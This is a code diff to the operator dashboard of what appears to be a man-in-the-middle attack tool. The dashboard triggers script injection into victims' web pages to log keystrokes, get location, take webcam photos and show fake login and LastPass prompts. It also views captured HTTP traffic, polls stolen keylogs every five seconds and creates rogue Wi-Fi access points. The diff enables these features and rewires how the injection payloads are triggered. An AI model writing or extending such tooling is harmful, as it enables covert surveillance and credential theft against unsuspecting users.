@@ -91,7 +91,7 @@
               <small>Inject a keylogger into the page.</small>
             </li>
 
-            <!-- <li class="list-group-item">
+            <li class="list-group-item">
               <div class="onoffswitch">
                 <input type="checkbox" name="takePhoto" class="onoffswitch-checkbox" id="takePhoto">
                 <label class="onoffswitch-label" for="takePhoto">
@@ -136,7 +136,7 @@
             </div>
             <h4>Request Lastpass Login</h4>
             <small>Pop up a lastpass login on the user's screen</small>
-          </li> -->
+          </li>
           </ul>
 
         <li class="list-group-item">
@@ -159,11 +159,12 @@
 
       <!-- Nav tabs -->
       <ul class="nav nav-tabs" role="tablist">
-        <li role="presentation"><a href="#SelectUser" aria-controls="SelectUser" role="tab" data-toggle="tab">Select User</a></li>
+        <!-- <li role="presentation"><a href="#SelectUser" aria-controls="SelectUser" role="tab" data-toggle="tab">Select User</a></li> -->
         <li role="presentation" class="active"><a href="#hars" aria-controls="hars" role="tab" data-toggle="tab">Har Viewer</a></li>
         <li role="presentation"><a href="#logs" aria-controls="logs" role="tab" data-toggle="tab">Key Logs</a></li>
+        <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab">Create Access Points</a></li>
         <li role="presentation"><a href="#wifiRequests" aria-controls="wifiRequests" role="tab" data-toggle="tab"><s>Discover Local WiFi Requests</s></a></li>
-        <li role="presentation"><a href="#CreateAP" aria-controls="CreateAP" role="tab" data-toggle="tab"><s>Create Access Points</s></a></li>
+        
       </ul>
 
       <!-- Tab panes -->
@@ -182,7 +183,7 @@
                 </ul>
               </div>
             </div>
-            <button class="btn btn-danger" id="deletehars">Delete current data</button>
+            <!-- <button class="btn btn-danger" id="deletehars">Delete current data</button> -->
             <!-- dropdown button -->
           </nav>
 
@@ -197,7 +198,16 @@
           <div id='wifi-requests'></div>
         </div>
         <div role="tabpanel" class="tab-pane" id="CreateAP">
-          <input type="text" class=".input-prepend" title="name for the wifi access point" placeholder="access point name">
+          <div class="accesspoint">
+          Name: <input type="text" id="apname" class="btn .input-prepend" title="name for the wifi access point" placeholder="access point name">
+          <button type="submit" class="btn" id="createaccesspoint">Create!</button>
+          </div>
+          <div>
+            <div id="wifiError" class="wifi">
+            </div>
+            <div if="wifiOutput" class="wifi">
+            </div>
+          </div>
         </div>
         <div role="tabpanel" class="tab-pane" id="SelectUser">
           <ul>
@@ -224,91 +234,56 @@
   $("#triggerWolfPack").click( function () {
     $.get( "/TriggerWolfPack", function ( data ) { } );
   });
-
   $("#keylogger").click(function() {
     $.get( "/TriggerInjection?trigger=keylogger", function ( data ) { } );
   })
-
-
-
-
-
-  $(".toplevel").click( function () {
-    $(".btn").removeClass("btn-success");
-    $(this).addClass("btn-success");
-  });
-  
-  $("#deletehars").click(function() {
-     $.get( "/App/DeleteHars", function ( data ) {
-      $.each(data, function (i, d) {
-        var descr = d.split("_", -1)
-        console.log(descr)
-        $("#clients").append('<button class="btn btn-default" id="passthrough">'+descr[1]+' : ' + descr[2]+'</button>')
-      })
-    });
+  $("#getLocation").click(function() {
+    $.get( "/TriggerInjection?trigger=getlocation", function ( data ) { } );
   })
-  $("#intercept").click(function() {
-    $.get( "/InterceptHTTPS", function( data ) {
-    });
+  $("#takePhoto").click(function() {
+    $.get( "/TriggerInjection?trigger=takephoto", function ( data ) { } );
   })
-  $("#flipImages").click(function() {
-    // alert("flipping images currently disabled")
-    // $.get( "/FlipImages", function( data ) {
-    //   $(".attackType").html("Flip Images")
-    // });
+  $("#requestLogin").click(function() {
+    $.get( "/TriggerInjection?trigger=requestlogin", function ( data ) { } );
   })
-  $("#replaceImages").click(function() {
-    // alert("Replacing images currently disabled")
-    // $.get( "/FlipImages", function( data ) {
-    //   $(".attackType").html("Flip Images")
-    // });
+  $("#requestLastpass").click(function() {
+    $.get( "/TriggerInjection?trigger=requestlasspass", function ( data ) { } );
   })
-  // $("#redirect").click(function() {
-  //   $.get( "/RedirectPage", function( data ) {
+  $("#createaccesspoint").click(function() {
+    $.get( "/CreateAccessPoint?name="+$("#apname").val(), function ( data ) { 
+      console.log(data.Output)
+      $("#wifiOutput").html("<b>Output: </b>", data.Output)
+      $("#wifiError").html("<b>Error: </b>", data.Error)
+    } );
+  })
+
+
+  // $("#deletehars").click(function() {
+  //    $.get( "/App/DeleteHars", function ( data ) {
+  //     $.each(data, function (i, d) {
+  //       var descr = d.split("_", -1)
+  //       console.log(descr)
+  //       $("#clients").append('<button class="btn btn-default" id="passthrough">'+descr[1]+' : ' + descr[2]+'</button>')
+  //     })
   //   });
   // })
-  // $("#block").click(function() {
-  //   $.get( "/BlockWebsites", function( data ) {
-  //   });
-  // })
-  // $("#keylogger").click(function() {
-  //   $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Fkeylogger.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-  //   });
-  // })
- $("#getLocation").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FgetLocation.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
- $("#takePhoto").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FtakePhoto.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
-   $("#requestLogin").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Flogin.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
-   $("#requestLastpass").click(function() {
-    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FlastpassInjection.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
-    });
-  })
-  $("#getKeyLogs").click(function() {
-    $('#userLogs').html("")//clear
-      $.get("/App/GetKeylogs", function ( data ) {
-        var lastURL = data[0].Page
-        $('#userLogs').append(lastURL+"<p>")
-        $.each(data, function(i, j) {
-          if ( j.Page === lastURL ) {
-            $('#userLogs').append(j.Content)
-          } else {
-            $('#userLogs').append("<p>"+j.Page)
-            $('#userLogs').append(j.Content)
-          }
-          lastURL = j.Page
-        })
 
-      })
-
-  })
+ // $("#getLocation").click(function() {
+ //    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FgetLocation.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+ //    });
+ //  })
+ // $("#takePhoto").click(function() {
+ //    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FtakePhoto.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+ //    });
+ //  })
+ //   $("#requestLogin").click(function() {
+ //    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2Flogin.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+ //    });
+ //  })
+ //   $("#requestLastpass").click(function() {
+ //    $.get( "/InjectScript?replace=</body>&result=%3Cscript%20src%3D%22http://127.0.0.1:9000/public/InjectionScripts%2FlastpassInjection.js%22%3E%3C%2Fscript%3E</body>", function( data ) {
+ //    });
+ //  })
   //get the hars that have been collected
   //update for each connected client
   $("#gethars").click(function() {
@@ -318,9 +293,10 @@
     $.each(data, function(i, j) {
       var descr = j.split("_", -1)
       var listItem = $('<li><a href="#" id="'+j+'">'+descr[1]+' : ' + descr[2]+'</a></li>').click(function() {
-        $.getJSON( "/public/hars/"+j, function( data ) {
+        $.getJSON( "/GetHar/?harname="+j, function( data ) {
+          var obj = JSON.parse(data)
             initHarView();
-            har.render(data);
+            har.render(obj);
         });
       })
       $("#clients").append(listItem)
@@ -360,9 +336,37 @@ function initHarView(){
    har = $('#har-view').data('HarView');
 
 }
+
+
+
+function captureKeyLogs() {
+
+  $('#userLogs').html("")//clear
+  $.get("/GetKeylogs", function ( data ) {
+
+    if (data === null) {
+      return
+    }
+    var lastURL = data[0].Page
+    $('#userLogs').append(lastURL+"<p>")
+    $.each(data, function(i, j) {
+      if ( j.Page === lastURL ) {
+        $('#userLogs').append(j.Content)
+      } else {
+        $('#userLogs').append("<p>"+j.Page)
+        $('#userLogs').append(j.Content)
+      }
+      lastURL = j.Page
+    })
+
+  })
+   setTimeout(captureKeyLogs, 5000);
+}
+
 //get the latest hars that are available
 $(document).ready(function() {
   initHarView();
+  setTimeout(captureKeyLogs, 5000);
 })
 
 </script>
